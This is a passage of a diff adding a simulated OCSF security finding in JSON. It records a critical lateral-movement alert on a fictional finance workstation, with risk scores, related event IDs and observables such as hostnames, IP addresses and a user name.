+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-proc-0012"
+        }
+      },
+      {
+        "uid": "evidence:finding-0015:6",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-net-0013"
+        }
+      },
+      {
+        "uid": "evidence:finding-0015:7",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-net-0014"
+        }
+      }
+    ],
+    "confidence": "High",
+    "confidence_id": 3,
+    "confidence_score": 92,
+    "risk_level": "Critical",
+    "risk_level_id": 5,
+    "risk_score": 98,
+    "impact": "Endpoint compromise and credential exposure risk",
+    "impact_id": 4,
+    "impact_score": 88,
+    "is_alert": true,
+    "start_time": 1778774648000,
+    "end_time": 1778774764000,
+    "observables": [
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      },
+      {
+        "name": "device.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.20.25",
+        "record_id": "10.10.20.25"
+      },
+      {
+        "name": "device.user.name",
+        "type": "User Name",
+        "type_id": 4,
+        "value": "j.smith",
+        "record_id": "user:j.smith"
+      },
+      {
+        "name": "src_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "203.0.113.45",
+        "record_id": "203.0.113.45"
+      },
+      {
+        "name": "dst_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.20.25",
+        "record_id": "10.10.20.25"
+      }
+    ],
+    "vendor_attributes": {
+      "kill_chain_stage": "lateral-movement",
+      "scenario_id": "sim-acme-pivot-001",
+      "correlation_rule_uid": "rule:sim:ocsf:pivot-lateral-movement"
+    }
+  }
+]
